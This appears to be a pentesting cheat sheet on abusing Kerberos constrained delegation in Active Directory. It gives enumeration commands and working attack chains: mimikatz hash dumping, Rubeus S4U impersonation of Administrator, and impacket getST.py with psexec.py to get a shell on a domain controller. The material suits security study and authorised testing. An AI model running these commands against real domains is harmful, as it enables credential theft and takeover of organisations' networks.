### Content

- [Built-in SPNs Recognized for Computer Accounts](#built-in-spns-recognized-for-computer-accounts)
- [Enumeration](#enumeration)
- [From Windows](#from-windows)
- [From Linux](#from-linux)

---

> [!Important]
> 
> If the `impersonated` account is [is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts) or a member of the [Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) group, the delegation will fail.
> 
> For RID 500, "Administrator" you need to tick the option “Account is sensitive and cannot be delegated” in the account settings even if the RID500 account is in Protected Users. (source: [sensepost](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/))


<img src="/assets/constrained_delegation_cheat_sheet.png" style="display: block; margin:auto; height:600px;">

###### Built-in SPNs Recognized for Computer Accounts

| SPN     | SPN       | SPN              | SPN      | SPN         | SPN      | SPN       |
| ------- | --------- | ---------------- | -------- | ----------- | -------- | --------- |
| alerter | http      | policyagent      | scm      | plugplay    | netman   | dmserver  |
| appmgmt | ias       | protectedstorage | seclogon | eventsystem | wins     | netddedsm |
| browser | iisad     | rasman           | snmp     | fax         | scardsvr | rsvp      |
| cifs    | min       | remoteaccess     | spooler  | schedule    | dns      | ups       |
| cisvc   | messenger | replicator       | tapisrv  | oakley      | netlogon | eventlog  |
| clipsrv | msiserver | rpc              | time     | www         | samss    | dnscache  |
| dcom    | mcsvc     | rpclocator       | trksvr   | scesrv      | w3svc    | nmagent   |
| dhcp    | netdde    | rpcss            | trkwks   |             |          |           |

---
### Enumeration

From a Windows host

```PowerShell
# Powerview
Get-DomainComputer -TrustedToAuth | Select SamAccountName,DnsHostName,UserAccountControl,msds-allowedtodelegateto | FL

Get-DomainUser -TrustedToAuth

# PowerShell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

From a Linux host:

``` bash
# Using findDelegation.py from impacket to list both users and computers
findDelegation.py corp.local/sAMAccountName:Password -dc-ip <dcIP>
```

---

If an attacker compromised a host or an account that has constrained delegation set:

- Abuse Any Service:
	- The TGS has un unencrypted part which is the SPN of the requested service, which means that an attacker can modify this part without invalidating the ticket.
	- Delegation is allowed for the list of SPNs that is tied to the service account.
		- If the target service account expose more than one service, the attacker can change the SPN to access a different service exposed by this account.
		- Attacker also can relay the target TGS to request another TGS for another service using `S4U2Proxy` extension.
- Impersonate Any User:
	- If constrained delegation allows `protocol transition`, attacker can pretend to be anyone, arbitrarily, to authenticate against the specific list of available SPNs
		- Attacker gonna use `S4U2Self` extension (which requires `protocol transition`) to obtain a forwardable service ticket to itself on behalf of any user, then we can use `S4U2Proxy` to request a TGS ticket to any allowed service.

### From Windows

> [Pentest Everything has a great cheat sheet](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation#rubeus-binary-3)

The scenario: 

- An attacker compromised an administrator account on host `DMZ01$`
	- `DMZ01$` has the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC attribute set
		- Which means it has constrained delegation `with protocol transition` set.
	- The only allowed service for delegation is `www/WS01.corp.local`
- Attacker will get `DMZ01$` NT hash using mimikatz.
- Attacker will use Rubeus to:
	- Request a TGT for the machine `DMZ01$` account to have the ability to execute commands in its context.
	- `DMZ01$` will send S4U2Self request to the DC to get a TGS for `DMZ01$` on behalf of the Administrator.
	- `DMZ01$` using the Administrator TGS, will send a S4U2Proxy request to the DC to get a TGS for `www/WS01` on behalf of the Administrator.
	- Using `/altservice` to modify the SPN `www` to be `HTTP`.


```PowerShell
.\mimikatz.exe privilege::debug sekurlsa::msv exit

.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.corp.local /altservice:HTTP /user:DMZ01$ /rc4:<DMZ01_HASH> /ptt

# Using the Enter-PSSession which uses WinRM which uses the HTTP/S protocol in remote management
Enter-PSSession ws01.corp.local
```

---
### From Linux

Scenario: 

- We compromised the account beth which has constrained delegation with protocol transition set, and the only allowed service for delegation is `TERMSRV/DC01.CORP.LOCAL`.
- Use `getST.py` tool from `impacket` to craft a valid TGS from an arbitrary user to access the `TERMSRV` service on the `DC01` host.
	- This will generate a TGS and will save it as `Administrator.ccache`, which we will export its path to the environment variable `KRB5CCNAME`.
- Use the TGS with `psexec.py`, which will update the SPN in this TGS on the fly to get an interactive shell.

```bash
$ getST.py -spn TERMSRV/DC01 'CORP.LOCAL/beth:password' -impersonate Administrator

$ psexec.py -k -no-pass CORP.LOCAL/administrator@DC01
```